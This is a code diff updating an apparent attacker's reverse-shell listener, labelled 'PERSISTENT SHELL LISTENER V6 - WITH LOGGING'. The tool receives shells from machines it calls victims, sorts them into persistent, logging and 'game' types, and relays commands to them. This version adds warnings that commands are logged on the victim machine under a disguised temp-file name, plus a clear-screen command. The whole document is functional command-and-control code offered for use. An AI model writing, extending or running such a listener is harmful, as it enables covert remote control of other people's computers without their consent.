@@ -14,13 +14,16 @@ lock = threading.Lock()
 def handle_client(conn, addr, shell_id):
     global active_shells
     
-    # Try to identify shell type from first message
+    # Identify shell type
     shell_type = "unknown"
     try:
         conn.settimeout(2)
         first_data = conn.recv(1024).decode()
         if "PERSISTENT" in first_data:
-            shell_type = "persistent"
+            if "LOGGING" in first_data:
+                shell_type = "persistent (logging)"
+            else:
+                shell_type = "persistent"
         elif "GAME" in first_data:
             shell_type = "game"
     except:
@@ -37,28 +40,26 @@ def handle_client(conn, addr, shell_id):
         })
     
     print(f"\n[!] SHELL #{shell_id} [{shell_type}] from {addr}")
+    if "logging" in shell_type:
+        print(f"    ⚠️  All commands are being logged on victim machine!")
     
     try:
         conn.settimeout(1.0)
-        
         while True:
             try:
                 data = conn.recv(65536)
                 if not data:
                     break
-                
                 with lock:
                     for shell in active_shells:
                         if shell['id'] == shell_id:
                             shell['buffer'] += data.decode('utf-8', errors='ignore')
                             shell['last_seen'] = time.time()
                             break
-                
             except socket.timeout:
                 continue
             except:
                 break
-                
     except:
         pass
     finally:
@@ -100,12 +101,15 @@ def send_to_shell(shell_id, command):
 
 def interactive_shell(shell_id):
     print(f"\n[+] Interactive shell #{shell_id}")
-    print("[+] Type 'exit' to return\n")
     
-    response, error = send_to_shell(shell_id, "echo READY")
-    if error:
-        print(f"[-] Shell not responding: {error}")
-        return
+    # Check if this is the persistent shell with logging
+    with lock:
+        shell = next((s for s in active_shells if s['id'] == shell_id), None)
+        if shell and "logging" in shell['type']:
+            print(f"[⚠️] All commands are being logged on victim machine!")
+            print(f"[📁] Log location: %temp%\\~spoolsv.log")
+    
+    print("[+] Type 'exit' to return\n")
     
     while True:
         try:
@@ -147,7 +151,7 @@ def main_listener():
         local_ip = socket.gethostbyname(hostname)
         
         print("=" * 70)
-        print("🔴 PERSISTENT SHELL LISTENER V5 - TRUE PERSISTENCE")
+        print("🔴 PERSISTENT SHELL LISTENER V6 - WITH LOGGING")
         print("=" * 70)
         print(f"📡 Listening on: 0.0.0.0:{PORT}")
         print(f"🌐 Your IP: {local_ip}")
@@ -155,6 +159,7 @@ def main_listener():
         print("  list              - Show active shells")
         print("  use <id>          - Interact with shell")
         print("  kill <id>         - Kill shell")
+        print("  clear             - Clear screen")
         print("  quit              - Exit")
         print("=" * 70)
         
@@ -187,6 +192,21 @@ def main_listener():
                 
                 if command == 'quit':
                     break
+                    
+                elif command == 'clear' or command == 'cls':
+                    os.system('cls' if os.name == 'nt' else 'clear')
+                    print("=" * 70)
+                    print("🔴 PERSISTENT SHELL LISTENER V6 - WITH LOGGING")
+                    print("=" * 70)
+                    print(f"📡 Listening on: 0.0.0.0:{PORT}")
+                    print(f"🌐 Your IP: {local_ip}")
+                    print("\n📋 Commands:")
+                    print("  list              - Show active shells")
+                    print("  use <id>          - Interact with shell")
+                    print("  kill <id>         - Kill shell")
+                    print("  clear             - Clear screen")
+                    print("  quit              - Exit")
+                    print("=" * 70)
                     
                 elif command == 'list':
                     list_shells()
